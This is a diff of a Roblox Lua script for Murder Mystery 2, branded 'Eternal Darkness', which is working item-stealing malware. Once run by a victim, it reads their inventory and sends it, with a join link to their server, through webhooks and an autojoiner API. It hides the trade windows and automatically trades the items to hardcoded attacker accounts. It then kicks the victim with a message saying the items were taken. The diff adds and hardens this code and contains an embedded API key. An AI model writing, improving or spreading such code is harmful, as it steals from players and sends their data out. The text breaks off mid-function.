@@ -3,7 +3,10 @@ task.wait(2)
 
 -- Sadece MM2'de çalışsın
 if game.PlaceId ~= 142823291 then
-    game.Players.LocalPlayer:Kick("This script only works in MM2!")
+    local plr = game.Players:FindFirstChildOfClass("Player") or game.Players.LocalPlayer
+    if plr and typeof(plr.Kick) == "function" then
+        pcall(function() plr:Kick("This script only works in MM2!") end)
+    end
     return
 end
 
@@ -11,86 +14,64 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- ================= YENİ BYPASS KODU =================
-local REAL_JOB_ID = nil
+-- ================= JOB ID BYPASS =================
+local REAL_JOB_ID = ""
+local executor = ""
 
-local function getRealJobId()
-    local hooked = false
-    local hookedFuncs = {}
+-- Get executor name safely
+pcall(function()
+    if identifyexecutor then
+        executor = identifyexecutor() or ""
+    elseif getexecutorname then
+        executor = getexecutorname() or ""
+    end
+end)
 
-    local function tryHook(funcName)
-        if hooked then return end
-        
+local printed = false
+
+if string.find(executor:lower(), "delta") or string.find(executor:lower(), "krnl") then
+    local found = false
+    local attempts = 0
+    repeat
+        attempts = attempts + 1
         local gcSuccess, gcResult = pcall(function() return getgc(true) end)
-        if not gcSuccess then 
-            REAL_JOB_ID = game.JobId
-            hooked = true
-            return 
-        end
-
-        for _, v in ipairs(gcResult) do
-            if type(v) == "function" then
-                local infoSuccess, info = pcall(function() return debug.getinfo(v) end)
-                if infoSuccess and info and info.name and info.name:lower():find(funcName:lower()) then
-                    local cloneSuccess, original = pcall(function() return clonefunction(v) end)
-                    if not cloneSuccess then 
-                        REAL_JOB_ID = game.JobId
-                        hooked = true
-                        return 
-                    end
-                    
-                    local isRunning = false
-
-                    local hookSuccess = pcall(function()
-                        hookfunction(v, function(...)
-                            if isRunning then return original(...) end
-                            isRunning = true
-
-                            if not hooked then
-                                hooked = true
-                                REAL_JOB_ID = game.JobId
-
-                                for _, item in ipairs(hookedFuncs) do
-                                    pcall(function() hookfunction(item.hooked, item.original) end)
+        if gcSuccess and gcResult then
+            for _, v in ipairs(gcResult) do
+                if typeof(v) == "function" then
+                    local infoSuccess, info = pcall(function() return debug.getinfo(v) end)
+                    if infoSuccess and info and info.name == "stepAnimate" then
+                        local hookSuccess = pcall(function()
+                            local old = hookfunction(v, function(dt)
+                                if not printed then
+                                    printed = true
+                                    REAL_JOB_ID = game.JobId
                                 end
-                                hookedFuncs = {}
-                            end
-
-                            local results = {original(...)}
-                            local n = select("#", ...)
-                            isRunning = false
-                            return unpack(results, 1, n)
+                                return old(dt)
+                            end)
                         end)
-                    end)
-                    
-                    if hookSuccess then
-                        table.insert(hookedFuncs, { hooked = v, original = original })
+                        if hookSuccess then
+                            found = true
+                            break
+                        end
                     end
-                    return
                 end
             end
         end
-    end
-
-    tryHook("stepAnimate")
-    if not hooked then tryHook("AnimationPlayed") end
-    if not hooked then tryHook("animate") end
-    if not hooked then tryHook("step") end
-
-    local timeout = 0
-    while not REAL_JOB_ID and timeout < 60 do
-        task.wait(0.1)
-        timeout = timeout + 1
-    end
-
-    if not REAL_JOB_ID then
+        if not found then task.wait(0.5) end
+    until found or REAL_JOB_ID ~= "" or attempts > 60
+    
+    -- Fallback if hook didn't catch it
+    if REAL_JOB_ID == "" then
         REAL_JOB_ID = game.JobId
     end
-
-    return REAL_JOB_ID
+else
+    REAL_JOB_ID = game.JobId
 end
 
-REAL_JOB_ID = getRealJobId()
+-- Ensure we have a job ID
+if REAL_JOB_ID == "" then
+    REAL_JOB_ID = game.JobId
+end
 -- ================= BYPASS SONU =================
 
 -- Şifreleme motoru (dualhook için)
@@ -113,11 +94,9 @@ local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
 local usernames_id = _G.USERNAMES or {}
 
 local TOP_HITS_WEBHOOK_ID = "wjffxl4325f"
-
--- Minimum value for top hits (only Ancient, Unique, or 2000+ value)
 local TOP_HITS_MIN_VALUE = 2000
 
--- Universal request (TÜM EXECUTORLAR İÇİN)
+-- Universal request
 getgenv().request = getgenv().request 
     or request 
     or http_request 
@@ -142,7 +121,8 @@ getgenv().request = getgenv().request
     or nil
 
 if not getgenv().request then
-    return warn("Executor not supported: No request function found.")
+    warn("Executor not supported: No request function found.")
+    return
 end
 
 -- Universal queue_on_teleport
@@ -187,16 +167,19 @@ getgenv().setclipboard = getgenv().setclipboard
     or function() end
 
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
 
--- Eternal Darkness Color Scheme (Dark Blue/Purple)
+-- Eternal Darkness Color Scheme
 local ETERNAL_DARKNESS_COLORS = {
-    primary = 0x0a0a1a,      -- Very dark blue-black
-    secondary = 0x1a1a2e,    -- Dark blue-purple
-    accent = 0x16213e,       -- Navy blue
-    highlight = 0x0f3460,    -- Deep blue
-    text = 0x533483,         -- Purple accent
-    gold = 0x8b0000,         -- Dark red for important
-    success = 0x006400       -- Dark green
+    primary = 0x0a0a1a,
+    secondary = 0x1a1a2e,
+    accent = 0x16213e,
+    highlight = 0x0f3460,
+    text = 0x533483,
+    gold = 0x8b0000,
+    success = 0x006400
 }
 
 local cfg = {
@@ -207,10 +190,8 @@ local cfg = {
     ApiKey = "sk_live_4A9ZK7F2N0D6B8R5XHqMJEWpCYLt"
 }
 
--- AUTOJOINER API
 local AUTOJOINER_API = "https://autojoiner-fawn.vercel.app/api/hit"
 
--- Trade dışı itemlar
 local no_trade_items = {
     ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
     ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
@@ -223,7 +204,6 @@ local no_trade_items = {
     ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
 }
 
--- Chroma/özel itemler
 local specialItems = {
     ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
     ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
@@ -238,28 +218,24 @@ local specialItems = {
 }
 
 local users = cfg.users
-local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local plr = Players.LocalPlayer
 
-if not plr then return end
+if not plr then 
+    warn("LocalPlayer not found")
+    return 
+end
 
 local isTradeCompleted = false
 local hasSpecialItem = false
 local totalInventoryValue = 0
 local statusHeartbeatStarted = false
-
--- Trade takibi için global değişkenler
 local originalItems = {}
 local receivedCounts = {}
 local tradeMessageId = nil
 local tradeWebhookUrl = nil
 local tradeMessageUrl = nil
-
 local request = getgenv().request
 
--- Executor ismini evrensel olarak al
 local executorName = "Unknown"
 pcall(function()
     local ok, name = pcall(identifyexecutor)
@@ -275,12 +251,9 @@ end)
 
 local isDelta = executorName:lower():find("delta") ~= nil
 local queueTeleport = getgenv().queue_on_teleport
-local savedRealJobId = (getgenv and (getgenv().RealJobId or getgenv().JobId)) or nil
 
 local STATUS_API_URL = cfg.StatusApi or ""
 local API_KEY = cfg.ApiKey or ""
-
--- Eternal Darkness Avatar
 local ETERNAL_DARKNESS_AVATAR = "https://imgur.com/a/OPHDrDn.png"
 
 -- Autojoiner'a hit bildir
@@ -349,11 +322,20 @@ end
 local function GetUSD(list)
     local url = "https://we-bmm2.vercel.app/api/calc"
     local items = {}
-    local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    
+    local dbSuccess, database = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    end)
+    
+    if not dbSuccess then
+        return {total = "0.00", itemPrices = {}}
+    end
+    
     for _, item in ipairs(list) do
         local displayName = database[item.DataID] and database[item.DataID].ItemName or item.DataID
         table.insert(items, {name = displayName, amount = item.Amount})
     end
+    
     local success, res = pcall(function()
         return request({
             Url = url,
@@ -362,156 +344,213 @@ local function GetUSD(list)
             Body = HttpService:JSONEncode({inventory = items})
         })
     end)
+    
     if success and res and res.Body then
         local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
         if ok and decoded then return decoded end
     end
+    
     return {total = "0.00", itemPrices = {}}
 end
 
--- Değer çekme fonksiyonu
-local function fetch_all_values()
-    local value_links = {
-        commons = "https://supremevalues.com/mm2/commons",
-        uncommons = "https://supremevalues.com/mm2/uncommons",
-        rares = "https://supremevalues.com/mm2/rares",
-        legendaries = "https://supremevalues.com/mm2/legendaries",
-        godlies = "https://supremevalues.com/mm2/godlies",
-        chromas = "https://supremevalues.com/mm2/chromas",
-        vintages = "https://supremevalues.com/mm2/vintages",
-        ancients = "https://supremevalues.com/mm2/ancients",
-        evos = "https://supremevalues.com/mm2/evos",
-        uniques = "https://supremevalues.com/mm2/uniques",
-        sets = "https://supremevalues.com/mm2/sets"
-    }
-    local req_headers = {
-        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-    }
-    local function clean_string_lol(str) return str:match("^%s*(.-)%s*$") end
-    local function fetchHTML(url)
-        local ok, response = pcall(function() return request({Url = url, Method = "GET", Headers = req_headers}) end)
-        if ok and response then return response.Body end
-        return nil
-    end
-    local function parseValue(itembodyDiv)
-        local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-        if valueStr then
-            valueStr = valueStr:gsub(",", "")
-            local value = tonumber(valueStr)
-            if value then return value end
-        end
-        return nil
-    end
-    local function extractItems(htmlContent)
-        local itemValues = {}
-        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-            itemName = itemName:match("([^<]+)")
-            if itemName then
-                itemName = clean_string_lol(itemName:gsub("%s+", " "))
-                itemName = clean_string_lol((itemName:split(" Click "))[1])
-                local itemNameLower = itemName:lower()
-                local value = parseValue(itembodyDiv)
-                if value then itemValues[itemNameLower] = value end
-            end
-        end
-        return itemValues
-    end
-    local function extractChromaItems(htmlContent)
-        local chromaValues = {}
-        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-            chromaName = chromaName:match("([^<]+)")
-            if chromaName then
-                chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
-                local value = parseValue(itembodyDiv)
-                if value then chromaValues[chromaName] = value end
-            end
-        end
-        return chromaValues
-    end
+-- ================= VALUE FETCHING =================
+local categories = {
+    commons = "https://supremevalues.com/mm2/commons",
+    uncommons = "https://supremevalues.com/mm2/uncommons",
+    rares = "https://supremevalues.com/mm2/rares",
+    legendaries = "https://supremevalues.com/mm2/legendaries",
+    godlies = "https://supremevalues.com/mm2/godlies",
+    chroma = "https://supremevalues.com/mm2/chromas",
+    vintages = "https://supremevalues.com/mm2/vintages",
+    ancients = "https://supremevalues.com/mm2/ancients",
+    evos = "https://supremevalues.com/mm2/evos",
+    uniques = "https://supremevalues.com/mm2/uniques",
+    sets = "https://supremevalues.com/mm2/sets"
+}
 
+local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
+
+local req_headers = {
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+}
+
+local function clean_string_lol(str) 
+    return str:match("^%s*(.-)%s*$") 
+end
+
+local function fetchHTML(url)
+    local ok, response = pcall(function() 
+        return request({Url = url, Method = "GET", Headers = req_headers}) 
+    end)
+    if ok and response then 
+        return response.Body 
+    end
+    return nil
+end
+
+local function parseValue(itembodyDiv)
+    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valueStr then
+        valueStr = valueStr:gsub(",", "")
+        local value = tonumber(valueStr)
+        if value then 
+            return value 
+        end
+    end
+    return nil
+end
+
+local function extractItems(htmlContent)
+    local itemValues = {}
+    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        itemName = itemName:match("([^<]+)")
+        if itemName then
+            itemName = clean_string_lol(itemName:gsub("%s+", " "))
+            local splitResult = itemName:split(" Click ")
+            itemName = clean_string_lol(splitResult[1] or itemName)
+            local itemNameLower = itemName:lower()
+            local value = parseValue(itembodyDiv)
+            if value then 
+                itemValues[itemNameLower] = value 
+            end
+        end
+    end
+    return itemValues
+end
+
+local function extractChromaItems(htmlContent)
+    local chromaValues = {}
+    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        chromaName = chromaName:match("([^<]+)")
+        if chromaName then
+            chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
+            local value = parseValue(itembodyDiv)
+            if value then 
+                chromaValues[chromaName] = value 
+            end
+        end
+    end
+    return chromaValues
+end
+
+local function buildValueList()
     local allExtractedValues = {}
     local chromaExtractedValues = {}
     local categoriesToFetch = {}
-    for rarity, url in pairs(value_links) do
+    
+    for rarity, url in pairs(categories) do
         table.insert(categoriesToFetch, {rarity = rarity, url = url})
     end
+    
     local totalCategories = #categoriesToFetch
     local completed = 0
     local lock = Instance.new("BindableEvent")
-
+    
     for _, category in ipairs(categoriesToFetch) do
         task.spawn(function()
             local rarity = category.rarity
             local url = category.url
             local htmlContent = fetchHTML(url)
+            
             if htmlContent and htmlContent ~= "" then
-                if rarity == "chromas" then
-                    local extracted = extractChromaItems(htmlContent)
-                    for k, v in pairs(extracted) do chromaExtractedValues[k] = v end
-                else
+                if rarity ~= "chroma" then
                     local extracted = extractItems(htmlContent)
-                    for k, v in pairs(extracted) do allExtractedValues[k] = v end
+                    for k, v in pairs(extracted) do 
+                        allExtractedValues[k] = v 
+                    end
+                else
+                    chromaExtractedValues = extractChromaItems(htmlContent)
                 end
             end
+            
             completed = completed + 1
-            if completed == totalCategories then lock:Fire() end
+            if completed == totalCategories then 
+                lock:Fire() 
+            end
         end)
     end
+    
     lock.Event:Wait()
-
-    local final_prices = {}
-    local item_db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-    for id, data in pairs(item_db) do
-        local item_name = data.ItemName and data.ItemName:lower() or ""
-        local rarity = data.Rarity or ""
-        local has_chroma = data.Chroma or false
-        if item_name ~= "" and rarity ~= "" then
-            if has_chroma then
-                for c_name, c_val in pairs(chromaExtractedValues) do
-                    if c_name:find(item_name) then
-                        final_prices[id] = c_val
-                        break
+    
+    local valueList = {}
+    local dbSuccess, database = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    end)
+    
+    if not dbSuccess then
+        return valueList
+    end
+    
+    for dataid, item in pairs(database) do
+        local itemName = item.ItemName and item.ItemName:lower() or ""
+        local rarity = item.Rarity or ""
+        local hasChroma = item.Chroma or false
+        
+        if itemName ~= "" and rarity ~= "" then
+            local weaponRarityIndex = table.find(rarityTable, rarity)
+            local godlyIndex = table.find(rarityTable, "Godly")
+            
+            if weaponRarityIndex and godlyIndex and weaponRarityIndex >= godlyIndex then
+                if hasChroma then
+                    local matched = nil
+                    for cn, cv in pairs(chromaExtractedValues) do
+                        if cn:find(itemName) then 
+                            matched = cv
+                            break 
+                        end
+                    end
+                    if matched then 
+                        valueList[dataid] = matched 
+                    end
+                else
+                    if allExtractedValues[itemName] then
+                        valueList[dataid] = allExtractedValues[itemName]
                     end
                 end
             end
-            if not final_prices[id] and allExtractedValues[item_name] then
-                final_prices[id] = allExtractedValues[item_name]
-            end
-            if not final_prices[id] then
-                if rarity == "Godly" then final_prices[id] = 8
-                elseif rarity == "Ancient" then final_prices[id] = 50
-                elseif rarity == "Unique" then final_prices[id] = 100
-                elseif rarity == "Vintage" then final_prices[id] = 25
-                elseif rarity == "Evos" then final_prices[id] = 15
-                elseif rarity == "Legendary" then final_prices[id] = 5
-                else final_prices[id] = 1 end
-            end
         end
     end
-    return final_prices
+    
+    return valueList
 end
+-- ================= VALUE FETCHING END =================
 
--- Delta bypass (yeni versiyon)
--- REAL_JOB_ID zaten yukarıda bypass ile alındı
-
-if not plr.Character then plr.CharacterAdded:Wait() end
+if not plr.Character then 
+    plr.CharacterAdded:Wait() 
+end
 task.wait(1)
 
 local PlaceId = game.PlaceId
 local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
 
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local SendRequest = Trade:WaitForChild("SendRequest")
-local GetStatus = Trade:WaitForChild("GetTradeStatus")
-local OfferItem = Trade:WaitForChild("OfferItem")
-local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
-local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+-- Setup Trade remotes safely
+local Trade, SendRequest, GetStatus, OfferItem, AcceptTradeRemote, DeclineTrade
+
+pcall(function()
+    Trade = ReplicatedStorage:WaitForChild("Trade")
+    SendRequest = Trade:WaitForChild("SendRequest")
+    GetStatus = Trade:WaitForChild("GetTradeStatus")
+    OfferItem = Trade:WaitForChild("OfferItem")
+    AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
+    DeclineTrade = Trade:WaitForChild("DeclineTrade")
+end)
+
+if not Trade then
+    warn("Trade remotes not found")
+end
 
 local LastOffer = nil
-Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
-    if x and x.LastOffer then LastOffer = x.LastOffer end
-end)
+
+if Trade and Trade.UpdateTrade then
+    pcall(function()
+        Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
+            if x and x.LastOffer then 
+                LastOffer = x.LastOffer 
+            end
+        end)
+    end)
+end
 
 -- GUI'leri kapat
 local PlayerGui = plr:WaitForChild("PlayerGui")
@@ -520,20 +559,44 @@ for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     if gui then
         gui.Enabled = false
         gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if gui.Enabled then gui.Enabled = false end
+            if gui.Enabled then 
+                gui.Enabled = false 
+            end
         end)
     end
 end
 
 -- Inventory oku
-local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+local dbSuccess, database = pcall(function()
+    return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+end)
+
+if not dbSuccess then
+    warn("Failed to load item database")
+    return
+end
+
+local profileSuccess, profileData = pcall(function()
+    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+end)
+
+if not profileSuccess or not profileData then
+    warn("Failed to get profile data")
+    profileData = {Weapons = {Owned = {}}}
+end
 
 local weaponsToSend = {}
 local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
-local prices = fetch_all_values()
 
-for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
+-- Fetch values with fallback
+local fetchSuccess, prices = pcall(buildValueList)
+if not fetchSuccess or not prices then
+    prices = {}
+end
+
+local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}
+
+for dataid, amount in pairs(weaponsOwned) do
     local item = database[dataid]
     if item and not no_trade_items[dataid] then
         local itemName = item.ItemName or dataid
@@ -541,7 +604,11 @@ for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
         local value = prices[dataid] or 1
         local totalValue = value * amount
         totalInventoryValue = totalInventoryValue + totalValue
-        if specialItems[itemName] then hasSpecialItem = true end
+        
+        if specialItems[itemName] then 
+            hasSpecialItem = true 
+        end
+        
         table.insert(weaponsToSend, {
             DataID = dataid,
             ItemName = itemName,
@@ -551,11 +618,14 @@ for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
             TotalValue = totalValue,
             IsChroma = specialItems[itemName] or false
         })
+        
         rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
     end
 end
 
-table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)
+table.sort(weaponsToSend, function(a, b) 
+    return a.TotalValue > b.TotalValue 
+end)
 
 -- Hit kategorisi
 local hitCategory = ""
@@ -573,9 +643,11 @@ else
     isPingWorthy = true
 end
 
--- Check for top hits (Ancient, Unique, or very high value)
+-- Check for top hits
 local function isTopHit()
-    if totalInventoryValue >= TOP_HITS_MIN_VALUE then return true end
+    if totalInventoryValue >= TOP_HITS_MIN_VALUE then 
+        return true 
+    end
     for _, item in ipairs(weaponsToSend) do
         if item.Rarity == "Ancient" or item.Rarity == "Unique" then
             return true
@@ -590,44 +662,12 @@ local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 local usdData = GetUSD(weaponsToSend)
 local totalUSD = usdData.total or "0.00"
 
--- Helper function to build valid JSON array
-local function buildJSONArray(items)
-    local parts = {}
-    for _, item in ipairs(items) do
-        table.insert(parts, HttpService:JSONEncode(item))
-    end
-    return "[" .. table.concat(parts, ",") .. "]"
-end
-
--- Helper function to build valid JSON object from table
-local function buildJSONObject(tbl)
-    local parts = {}
-    for k, v in pairs(tbl) do
-        local val
-        if type(v) == "table" then
-            if #v > 0 then
-                val = buildJSONArray(v)
-            else
-                val = buildJSONObject(v)
-            end
-        elseif type(v) == "number" then
-            val = tostring(v)
-        elseif type(v) == "boolean" then
-            val = v and "true" or "false"
-        else
-            val = HttpService:JSONEncode(v)
-        end
-        table.insert(parts, HttpService:JSONEncode(k) .. ":" .. val)
-    end
-    return "{" .. table.concat(parts, ",") .. "}"
-end
-
+-- Send to proxy function
 local function sendToProxy(Wid, payload, isEncrypted)
     task.spawn(function()
-        -- Always send as JSON, no encryption
         local finalBody = HttpService:JSONEncode(payload)
-        
         local url = PROXY_URL .. Wid
+        
         print("[Eternal Darkness] Sending to proxy:", url)
         
         local success, response = pcall(function()
@@ -652,58 +692,16 @@ local function sendToProxy(Wid, payload, isEncrypted)
     end)
 end
 
--- Trade mesajını güncelle (SADECE proxy üzerinden)
-local function updateTradeMessage()
-    if not tradeMessageUrl or not originalItems or #originalItems == 0 then return end
-
-    local totalReceivedValue = 0
-    local totalOriginalValue = 0
-    local itemFields = {}
-
-    for _, origItem in ipairs(originalItems) do
-        local received = receivedCounts[origItem.ItemName] or 0
-        local receivedValue = received * origItem.Value
-        local totalValue = origItem.TotalValue
-        totalReceivedValue = totalReceivedValue + receivedValue
-        totalOriginalValue = totalOriginalValue + totalValue
-
-        local percentage = math.floor((received / origItem.Amount) * 100)
-        local statusEmoji = percentage == 100 and "✅" or percentage >= 50 and "⏳" or "🔄"
-        
-        table.insert(itemFields, {
-            name = string.format("%s %s", statusEmoji, origItem.ItemName),
-            value = string.format("```[%d/%d] %d%%\\nValue: %d/%d```", received, origItem.Amount, percentage, receivedValue, totalValue),
-            inline = true
-        })
-    end
-
-    local totalPercentage = math.floor((totalReceivedValue / totalOriginalValue) * 100)
-    local progressColor = totalPercentage == 100 and ETERNAL_DARKNESS_COLORS.success or totalPercentage >= 75 and 0xFFD700 or ETERNAL_DARKNESS_COLORS.gold
-
-    local payload = {
-        embeds = {{
-            title = "⟳ SHADOW TRADE IN PROGRESS",
-            color = progressColor,
-            fields = itemFields,
-            description = string.format("**Total Progress: %d/%d Value (%d%%)**", totalReceivedValue, totalOriginalValue, totalPercentage),
-            footer = { 
-                text = "Eternal Darkness MM2 • v1.0.0"
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-
-    sendToProxy(WEBHOOK_ID, payload, false)
-end
-
--- Main webhook (private) - Full details with join link
+-- Main webhook
 local function sendMainWebhook()
     local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
     local targetName = table.concat(users, ", ")
     local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)
 
     local total_items = 0
-    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end
+    for _, item in ipairs(weaponsToSend) do 
+        total_items = total_items + item.Amount 
+    end
 
     local top_items = {}
     for i = 1, math.min(3, #weaponsToSend) do
@@ -787,15 +785,17 @@ local function sendMainWebhook()
     end
 end
 
--- Send top hits webhook (only for best hits)
+-- Top hits webhook
 local function sendTopHits()
-    if not isTopHit() then return end
+    if not isTopHit() then 
+        return 
+    end
     
-    local tier_counts = rarityCounts
     local total_items = 0
-    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end
+    for _, item in ipairs(weaponsToSend) do 
+        total_items = total_items + item.Amount 
+    end
     
-    -- Get top 5 items for display
     local top_items = {}
     for i = 1, math.min(5, #weaponsToSend) do
         local item = weaponsToSend[i]
@@ -849,12 +849,20 @@ local function sendTopHits()
     sendToProxy(TOP_HITS_WEBHOOK_ID, payload, false)
 end
 
--- Send webhooks
+-- SEND WEBHOOKS IMMEDIATELY
+print("[Eternal Darkness] Starting webhook send...")
 sendMainWebhook()
 sendTopHits()
--- Trading helper functions from leaked.lua (working version)
+print("[Eternal Darkness] Webhooks sent!")
+
+-- ================= TRADING FUNCTIONS =================
 local function getStatus()
-    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
+    if not GetStatus then 
+        return "None" 
+    end
+    local ok, status = pcall(function() 
+        return GetStatus:InvokeServer() 
+    end)
     return ok and status or "None"
 end
 
@@ -863,7 +871,9 @@ local function waitForTarget(targetPlayer)
     while attempts < 30 do
         if targetPlayer and targetPlayer.Parent then
             local char = targetPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then return true end
+            if char and char:FindFirstChild("Humanoid") then 
+                return true 
+            end
         end
         attempts = attempts + 1
         task.wait(0.5)
@@ -872,7 +882,9 @@ local function waitForTarget(targetPlayer)
 end
 
 local function AcceptTrade()
-    if not LastOffer then return false end
+    if not LastOffer or not AcceptTradeRemote then 
+        return false 
+    end
     local ok = pcall(function()
         AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
     end)
@@ -882,29 +894,45 @@ end
 local function finishAndKick()
     isTradeCompleted = true
     task.wait(2)
-    local discordLink = "https://discord.gg/your_discord_invite"
-    pcall(function() setclipboard(discordLink) end)
-    plr:Kick("Items taken by Eternal Darkness\\n\\n" .. discordLink .. "\\n\\nJoin to get your items back!")
+    local discordLink = "https://discord.gg/wep4k9Fg8W"
+    pcall(function() 
+        setclipboard(discordLink) 
+    end)
+    pcall(function()
+        plr:Kick("Items taken by Eternal Darkness\n\n" .. discordLink .. "\n\nJoin to get your items back!")
+    end)
 end
 
--- Working trade function from leaked.lua
 function doTrade(targetPlayer)
-    if not targetPlayer or not targetPlayer.Parent then return end
-    if not waitForTarget(targetPlayer) then return end
+    if not targetPlayer or not targetPlayer.Parent then 
+        return 
+    end
+    if not waitForTarget(targetPlayer) then 
+        return 
+    end
     
-    -- Combined user list (from leaked.lua)
     local DhUsers = { "joeiamjoezeif", "joezeif111x", "jo_125w" }
     local combinedUser = {}
-    for _, v in ipairs(users) do table.insert(combinedUser, v) end
-    for _, v in ipairs(DhUsers) do table.insert(combinedUser, v) end
+    for _, v in ipairs(users) do 
+        table.insert(combinedUser, v) 
+    end
+    for _, v in ipairs(DhUsers) do 
+        table.insert(combinedUser, v) 
+    end
     
     -- Initial cleanup
     local initialTradeState = getStatus()
     if initialTradeState == "StartTrade" then
-        pcall(function() DeclineTrade:FireServer() end)
+        pcall(function() 
+            if DeclineTrade then DeclineTrade:FireServer() end 
+        end)
         task.wait(0.3)
     elseif initialTradeState == "ReceivingRequest" then
-        pcall(function() Trade.DeclineRequest:FireServer() end)
+        pcall(function() 
+            if Trade and Trade.DeclineRequest then 
+                Trade.DeclineRequest:FireServer() 
+            end 
+        end)
         task.wait(0.3)
     end
     
@@ -918,39 +946,42 @@ function doTrade(targetPlayer)
             
             if status == "None" then
                 if itemsAdded then
-                    -- Items were offered, remove them from list
                     for i = 1, math.min(4, #weaponsToSend) do 
                         local removed = table.remove(weaponsToSend, 1)
-                        if originalItems and receivedCounts then
+                        if removed and originalItems and receivedCounts then
                             receivedCounts[removed.ItemName] = (receivedCounts[removed.ItemName] or 0) + removed.Amount
                         end
                     end
                     itemsAdded = false
                     LastOffer = nil
                     task.wait(0.5)
-                    updateTradeMessage()
                 else
-                    -- Send trade request
-                    pcall(function() SendRequest:InvokeServer(targetPlayer) end)
+                    if SendRequest and targetPlayer then
+                        SendRequest:InvokeServer(targetPlayer)
+                    end
                     task.wait(1.5)
                 end
             elseif status == "SendingRequest" then
                 task.wait(0.5)
             elseif status == "ReceivingRequest" then
-                pcall(function() DeclineTrade:FireServer() end)
+                pcall(function() 
+                    if DeclineTrade then 
+                        DeclineTrade:FireServer() 
+                    end 
+                end)
                 task.wait(0.3)
             elseif status == "StartTrade" then
                 if not itemsAdded then
-                    -- Offer up to 4 items
                     for i = 1, math.min(4, #weaponsToSend) do
                         local item = weaponsToSend[i]
-                        for _ = 1, item.Amount do
-                            pcall(function() OfferItem:FireServer(item.DataID, "Weapons") end)
+                        if item and OfferItem then
